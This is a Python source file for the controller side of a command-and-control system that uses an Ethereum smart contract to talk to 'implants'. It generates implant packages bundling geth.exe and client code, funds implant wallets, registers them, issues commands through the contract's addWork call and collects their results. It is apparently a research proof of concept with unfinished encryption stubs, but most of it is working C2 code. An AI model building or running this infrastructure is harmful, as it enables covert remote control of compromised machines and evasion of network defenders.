import yaml, os, sys, glob, json,argparse
from os.path import join as opj
from web3 import Web3, HTTPProvider
from web3.contract import ConciseContract
from Util.WalletOperations import unlockAccount, generatePassword, generateWallet, loadWallet, getAccountBalance
from shutil import copyfile,copy
from Util.EtherLogEvents import *
from Util.SolidityTypeConversions import *
from Util.TransactionLogger import TransactionLogger

import shelve

SERVER_CONF_FILE = opj('conf','server', 'ServerConf.yaml')
TRANSACTION_LOG_LOC = opj('logs', 'transaction.log')

REGISTRATION_REQUEST_EVENT_NAME = 'RegistrationRequest'
COMMAND_RESULT_EVENT_NAME = 'CommandResult'


class ServerCommands:

	def __init__(self, confFile, transactionLogFilename = TRANSACTION_LOG_LOC):

		with open(confFile) as f:
			conf = yaml.safe_load(f)

		self.contractAddress = conf['contract']['address']
		self.contractAbi = conf['contract']['abi']

		l.debug ("connecting to local node", conf['nodeRpcUrl'])
		self.web3 = Web3(HTTPProvider(conf['nodeRpcUrl']))

		# load CnC contract
		self.contract = self.loadContract()

		self.ownerAddress = conf['ownerAddress']
		self.ownerPassword = conf['ownerWalletPassword']
		self.keyGenScript = conf['keyGenScript']
		l.info("contract owner wallet address:",self.ownerAddress)
		unlockAccount(self.ownerAddress, self.ownerPassword, self.web3)

		self.gasLimit_tx = conf['gasLimit_tx']
		self.gasLimit_ev = conf['gasLimit_ev']

		self.instancesDbFile = conf['instancesDbFile']+'.'+self.contractAddress
		self.instances = shelve.open(self.instancesDbFile, writeback=True)
		
		if not 'cmdId' in self.instances:
			self.instances['cmdId'] = 0

		self.transactionCostLogger = TransactionLogger(transactionLogFilename, self.web3)

	
	def loadContract(self):
		'''
		loads the contract by address and abi
		:return:
		'''
		l.info('loading contract from:', self.contractAddress)
		l.debug('contract abi:', self.contractAbi)

		contract = self.web3.eth.contract(self.contractAbi, self.contractAddress,  ContractFactoryClass=ConciseContract)
		return contract

	'''
		Generates a new implant client package
		:param clientConfTemplateFile: template config file for clients
		:param clientId: unique id for client. optional
		:param rpcPort: local RPC port for client geth
		:param walletJson: use an existing wallet. Will genetate if None
		:param walletPassword: wallet passerd. one will be auto generated if None
		:return: clientAddress, clientConfTemplate
	'''
	def generateNewClientInstance (self, clientConfTemplateFile, fundValue, clientId = '', rpcPort = 8545, port=30303, walletJson = None, walletPassword = None):
		
		l.info ("Creating new Client instance")
		walletPassword = generatePassword(20) if walletPassword == None else walletPassword

		if not walletJson:
			l.info("Generating a new account")
			walletJson, public, private, address = generateWallet(
				self.keyGenScript, walletPassword)
		else:
			l.info("Loading existing wallet...")
			public, private, address = loadWallet(walletJson, walletPassword)

		l.info('Client Account Details:')
		l.info('\tPublic key:', public)
		l.info('\tAddress:', address)
		l.debug('\tPrivate key:', private)

		#Generate Conf
		with open(clientConfTemplateFile) as f:
			clientConfTemplate = yaml.safe_load(f)
		
		opMode = clientConfTemplate['opMode']
		l.info('Client is to be generated for', opMode, 'mode')
		
		clientConfTemplate['nodeRpcUrl'] = clientConfTemplate['nodeRpcUrl'].replace('%NODEPORT%', str(rpcPort))
		clientConfTemplate['BlockChainData'] = clientConfTemplate['BlockChainData'].replace('%CLIENT_ID%', clientId)
		clientConfTemplate[opMode]['gethCmd'] = ' '.join(clientConfTemplate[opMode]['gethCmd']) \
			.replace('%RPCPORT%', str(rpcPort)) \
			.replace('%NODEPORT%', str(port)) \
			.replace('%DATADIR%', clientConfTemplate['BlockChainData']) \
			.split(' ')
		clientConfTemplate['clientWallet'] = walletJson
		clientConfTemplate['clientWalletPassword'] = walletPassword
		
		if opMode == 'mainNet':
			clientConfTemplate['privateNet'] = None
		
		# Package the Code
		generatedDir = opj('generated',address)
		l.info('writing client payload into',generatedDir)
		os.makedirs(opj(generatedDir, 'src', 'Client'), exist_ok=True)
		for file in glob.glob(opj('src', 'Client', '*.py')):
			copy(file, opj(generatedDir, 'src', 'Client'))

		os.makedirs(opj(generatedDir, 'src', 'Util'), exist_ok=True)
		for file in glob.glob(opj('src', 'Util', '*.py')):
			copy(file, opj(generatedDir, 'src', 'Util'))

		os.makedirs(opj(generatedDir, 'bin'), exist_ok=True)
		copy(opj('bin','geth.exe'),opj(generatedDir, 'bin'))
		copy(opj('bin', 'genpriv.sh'), opj(generatedDir, 'bin'))

		os.makedirs(opj(generatedDir,'conf'), exist_ok=True)
		with open(opj(generatedDir, 'conf', 'clientConf.yaml'), 'w') as f:
			yaml.safe_dump(clientConfTemplate, f)

		os.makedirs(opj(generatedDir, 'build'), exist_ok=True)
		os.makedirs(opj(generatedDir, 'logs'), exist_ok=True)

		self.instances[address] = {}
		self.instances[address]['public'] = public
		self.instances[address]['commands'] = {}
		self.instances.sync()

		self.fundTransfer(address,fundValue)
		self.allowInstance(address)

		#TODO:Split the balance to a small amount up first in sendTransaction and add most of the funds in allowInstance, that way it will only be transfered if instance successfully registered.

		return address, clientConfTemplate

	def decryptMessage(self, msg, decrypt=True):
		'''
		Decrypt a message using wallet private key
		:param msg:
		:param decrypt:
		:return:
		'''
		if decrypt:
			pass
			#TODO complete. Need to find a proper elliptic curve crypto library in python
		return msg

	def encryptMessage(self, instanceAddress, msg, encrypt=True):
		'''
		Encrypt a message for an address using its public key
		:param instanceAddress:
		:param msg:
		:param encrypt:
		:return:
		'''
		public = self.instances[instanceAddress]['public']
		if encrypt:
			# TODO complete. Need to find a proper elliptic curve crypto library in python
			pass
		return msg

	def addWork(self, instanceAddress, command):
		'''
		Issue command for an implant address
		:param instanceAddress:
		:param command:
		:return:
		'''
		if instanceAddress in self.instances:
			commandEnc = self.encryptMessage(instanceAddress,command)
			instanceHash = sha3AsBytes(instanceAddress)
			txhash = self.contract.addWork(instanceHash, commandEnc, self.instances['cmdId'], transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
			
			l.info("Command",self.instances['cmdId']," was sent to",instanceAddress, 'txHash:', txhash)
			self.transactionCostLogger.insert(txhash, 'addWork',len(command))
			
			cmdId = self.instances['cmdId']
			cmdHandle = {'cmd': command,
						 'status': 'pending',
						 'id': cmdId,
						 'ts_tx': self.utilStrTimestamp(), # mark tx timestamp
						 'ts_rx': None,
						 't_roundtrip': None,
						 'output': None,
						 'c_addr': instanceAddress}

			self.instances[instanceAddress]['commands'][cmdId] = cmdHandle # , None]
			self.instances['cmdId'] += 1
			self.instances.sync()
			return cmdHandle
		return False

	def cmdArrival(self, c_addr, cmd_id, cmd): # subclass hook
		cmd['ts_rx'] = self.utilStrTimestamp() # mark rx timestamp

	def removeInstance (self, instanceAddress):
		'''
		Disallow an instance address from the network
		:param instanceAddress:
		:return:
		'''
		if instanceAddress in self.instances:
			instanceHash = sha3AsBytes(instanceAddress)
			txhash = self.contract.removeInstance(instanceHash, transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
			
			l.info("disallowing ",instanceAddress, 'txHash:', txhash)
			self.transactionCostLogger.insert(txhash, 'removeInstance', len(instanceAddress))
			
			l.info("sending back all remaining funds of", instanceAddress, 'to owner:', self.ownerAddress)
			self.unFundTransfer(instanceAddress)
			
			return True
		return False

	def allowInstance (self, instanceAddress):
		'''
		Allows an implant address to register. If already registered it will reset the address and require the implant to re-register
		:param instanceAddress:
		:return:
		'''
		if instanceAddress in self.instances:
			instanceHash = sha3AsBytes(instanceAddress)
			txhash = self.contract.allowInstance(instanceHash, transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
			
			l.info("registration allowed for:",instanceAddress,'hash:',encode_hex(instanceHash),'txHash:',txhash)
			self.transactionCostLogger.insert(txhash, 'allowInstance',len(instanceAddress))
			
			return True
		return False

	def registrationConfirmation (self, instanceAddress, sessionId):
		'''
		Sends a registration confirmation to a successful registration.
		:param instanceAddress:
		:param sessionId:
		:return:
		'''
		if instanceAddress in self.instances:
			instanceHash = sha3AsBytes(instanceAddress)
			sessionId = self.encryptMessage(instanceAddress, sessionId)
			txhash = self.contract.registrationConfirmation(instanceHash,sessionId, transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
			
			l.info("sending successful registration confirmation to",instanceAddress,'txHash:',txhash)
			self.transactionCostLogger.insert(txhash, 'registrationConfirmation', len(sessionId))
			
			return True
		else:
			l.error("Got an a registration request from an address that is not local instances cache! This means that local cache and contract are unsynced! instance address:",instanceAddress)
			return False

	def fundTransfer(self, instanceAddress, fundValue):
		'''
		Send Ether to an implant
		:param instanceAddress:
		:param fundValue:
		:return:
		'''
		if instanceAddress in self.instances:
			txhash = self.web3.eth.sendTransaction({'from': self.ownerAddress, 'to': instanceAddress,
			                                        'value': fundValue, 'gas': 21000})
			l.info("Sending ", self.web3.fromWei(fundValue, "ether"), "ether to client wallet", )
			self.transactionCostLogger.insert(txhash, 'fundTransfer',32)
		else:
			l.error("Got a request to transfer funds to an instance that is not on the instance list!!! refusing of course... :",instanceAddress)
			return False
		
	def unFundTransfer(self, instanceAddress):
		'''
		Removes all Ether from a compromised implant address. Use in case of implant compromise.
		DOES NOT WORK!!! Needs to open the implant account first.
		:param instanceAddress:
		:return:
		'''
		if instanceAddress in self.instances:
			#TODO Require open and load the implant account before running this.
			balance = getAccountBalance(self.web3,instanceAddress,'wei')
			txhash = self.web3.eth.sendTransaction({'from': instanceAddress, 'to': self.ownerAddress,
			                                        'value': int(balance), 'gas': 21000})
			l.info("Sending ", self.web3.fromWei(balance, "ether"), "ether to client wallet", )
			self.transactionCostLogger.insert(txhash, 'fundTransfer',32)
		else:
			l.error("Got a request to transfer funds to an instance that is not on the instance list!!! refusing of course... :",instanceAddress)
			return False

	def startInstanceRegistrationRequestWatcher(self):
			try:
				l.info('Starting to watch for new instance registrations...')
				self.regRequestFilter, eventABI = createLogEventFilter(REGISTRATION_REQUEST_EVENT_NAME,
																	self.contractAbi,
																	self.contractAddress,
																	self.web3,
																	topicFilters=[])

				def onRegistrationEventArrival(tx):
					l.debug('new registration request, tx:', tx)

					machineId = getLogEventArg(tx, eventABI, 'machineId')
					machineId = self.decryptMessage(machineId)

					transactionReceipt = self.web3.eth.getTransactionReceipt(tx['transactionHash'])
					instanceAddress = transactionReceipt['from']

					if instanceAddress in self.instances:
						l.info('confirmed new registration Request from:', instanceAddress, 'on machine:', machineId)
						#Contract has already validated that the instance is new and was not registered before
						#all we have to do is to generate the instanceId for it.
						sessionId = self.web3.sha3 (encode_hex(machineId) +
													instanceAddress[2:] + #removes the 0x...
													encode_hex(generatePassword())) #machineId+address+Random

						sessionAndMachineIdHash = self.web3.sha3(sessionId + machineId)

						self.registrationConfirmation(instanceAddress,sessionId)

						l.debug('saving sessionAndMachineIdHash for',instanceAddress,":", sessionAndMachineIdHash)
						self.instances[instanceAddress]['sessionAndMachineIdHash'] = sessionAndMachineIdHash
					else:
						raise ValueError('Someone tried to register an instance'+instanceAddress+' that is not in local instance cache. This can be cause contract and server are out of sync')
				
				self.regRequestFilter.watch(onRegistrationEventArrival)
				
			except Exception as e:
				l.error("Error in Instance Registraton event watcher operation:", e)
				if self.regRequestFilter and self.regRequestFilter.running:
					self.regRequestFilter.stopWatching()

	def startCommandResultWatcher(self):
			try:
				l.info('Starting to watch for command results from instances...')
				self.cmdResultFilter, eventABI = createLogEventFilter(COMMAND_RESULT_EVENT_NAME,
																	self.contractAbi,
																	self.contractAddress,
																	self.web3,
																	topicFilters=[])

				def onCommandResultEventArrival(tx):
					try:
						l.debug('new Command result:', tx)
	
						sessionAndMachineIdHash = bytesToHexString(getLogEventArg(tx, eventABI, 'sessionAndMachineIdHash'))
						commandResult = getLogEventArg(tx, eventABI, 'commandResult')
						commandResult = self.decryptMessage(commandResult)
						cmdId = getLogEventArg(tx, eventABI, 'cmdId')
	
						transactionReceipt = self.web3.eth.getTransactionReceipt(tx['transactionHash'])
						instanceAddress = transactionReceipt['from']
	
						if instanceAddress in self.instances:
							l.info('got new Commandresult for cmdId:',cmdId,"from:", instanceAddress, 'sessionAndMachineIdHash:', sessionAndMachineIdHash)
							if sessionAndMachineIdHash == self.instances[instanceAddress]['sessionAndMachineIdHash']:
								cmd = self.instances[instanceAddress]['commands'][cmdId]
								
								cmdResParsed = json.loads(commandResult)
								cmd['status'] = cmdResParsed['status']
								cmd['output'] = cmdResParsed['output']
								
								self.cmdArrival(instanceAddress, cmdId, cmd)
								
								self.instances.sync()
								l.info ('Confirmed match between instance issued command and result:',str(self.instances[instanceAddress]['commands'][cmdId])[0:200])
							else:
								l.error("Mismatch between saved session id and given by client! Client is invalid, recommend to remove!")
								l.error("given id:",sessionAndMachineIdHash,'saved:',self.instances[instanceAddress]['sessionAndMachineIdHash'])
						else:
							raise ValueError('got result from instance',instanceAddress,' that is not in local instance cache. This can be cause contract and server are out of sync')
					except Exception as e:
						l.error("Error getting Command Results:", e)
				self.cmdResultFilter.watch(onCommandResultEventArrival)
				
			except Exception as e:
				l.error("Error in Command Result event watcher operation:", e)
				if self.cmdResultFilter and self.cmdResultFilter.running:
					self.cmdResultFilter.stopWatching()

	def startAllWatchers(self):
		self.startInstanceRegistrationRequestWatcher()
		self.startCommandResultWatcher()

	def stopAllWatchers(self):
		self.cmdResultFilter.stopWatching()
		self.regRequestFilter.stopWatching()


	def printCommandResult (self, instance, cmdId):
		if instance in self.instances:
			if cmdId in self.instances[instance]['commands']:
				print ('command:',sc.instances[instance]['commands'][cmdId][0])
				result = json.loads(sc.instances[instance]['commands'][cmdId][1])
				print('result:', result['output'])

if __name__ == "__main__":
	parser = argparse.ArgumentParser(
		prog='Command line controller application',
		description='This is a command line utility for interacting with a deployed UC smart contract. It can be used to generating, issue command and managing implants'
		            ' Run with python -i to get shell. use object sc to call for different commands.'
					'Once loaded, watchers will be started on auto reply for any event sent to controller from implants',
		epilog='Available commands: generateNewClientInstance, allowInstance, removeInstance, addWork, fundTransfer'
	)
	parser.add_argument("baseDir", help="Location of base directory. all conf, scripts and bin files are assumed to exist in a subdirectory of base dir.")
	args = parser.parse_args()

	os.chdir(args.baseDir)
	l = LogWrapper.getDefaultLogger()
	l.info("Base dir: ", args.baseDir)
	
	sc = ServerCommands(SERVER_CONF_FILE)

	# clientAddress, clientConfTemplate = sc.generateNewClientInstance(opj('conf','clientGen', 'ClientConf.TEMPLATE.yaml'),fundValue=1000000000000000000, port=30304)

	sc.startAllWatchers()


